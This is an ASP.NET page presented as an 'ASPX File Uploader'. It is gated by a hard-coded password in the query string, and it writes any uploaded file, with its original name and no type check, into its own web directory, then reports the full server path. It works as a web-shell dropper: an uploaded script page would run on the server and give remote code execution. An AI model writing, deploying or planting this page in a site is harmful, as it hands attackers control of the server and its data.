<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%
    // ===== CONFIG =====
    string PASSWORD = "admin987654321!@";  // Change this to your password
    string UPLOAD_DIR = Server.MapPath("."); // Current directory

    // ===== AUTH CHECK =====
    string p = Request.QueryString["p"];
    if (string.IsNullOrEmpty(p) || p != PASSWORD)
    {
        Response.StatusCode = 403;
        Response.Write("Access Denied");
        Response.End();
    }

    // ===== UPLOAD LOGIC =====
    if (IsPostBack && Request.Files.Count > 0)
    {
        var file = Request.Files[0];
        if (file != null && file.ContentLength > 0)
        {
            string originalName = Path.GetFileName(file.FileName);
            string savePath = Path.Combine(UPLOAD_DIR, originalName);

            try
            {
                file.SaveAs(savePath);
                Response.Write("✅ File uploaded successfully!<br>");
                Response.Write("File Name: " + Server.HtmlEncode(originalName) + "<br>");
                Response.Write("Full Path: " + Server.HtmlEncode(savePath) + "<br>");
            }
            catch (Exception ex)
            {
                Response.Write("❌ Upload failed: " + Server.HtmlEncode(ex.Message));
                Response.Write("<br>Check folder permissions!");
            }
        }
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title>ASPX File Uploader</title>
</head>
<body>
<h2>ASPX File Uploader (Current Directory)</h2>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>

<p>Files will be saved in the same folder as this ASPX file.</p>
</body>
</html>
